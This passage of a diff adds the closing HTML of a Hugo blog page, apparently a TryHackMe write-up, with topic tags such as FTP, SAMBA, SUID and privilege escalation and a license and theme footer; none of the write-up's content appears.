+                class="buttonTag"
+                
+                href="/tags/linux">#,Linux</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/easy">#Easy</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/ftp">#FTP</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/privilege-escalation">#Privilege Escalation</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/samba">#SAMBA</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/suid">#SUID</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/tryhackme">#TryHackMe</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+
+<p><small>
+        2023 &copy; Licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution 4.0 International License</a>.
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
